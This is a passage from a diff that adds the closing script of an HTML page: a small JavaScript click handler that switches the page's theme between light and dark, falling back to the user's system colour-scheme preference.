+  var root = document.documentElement;
+  document.getElementById("themeBtn").addEventListener("click", function(){
+    var cur = root.getAttribute("data-theme");
+    if (!cur) cur = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    root.setAttribute("data-theme", cur==="dark" ? "light" : "dark");
+  });
+</script>
+</body>
+</html>
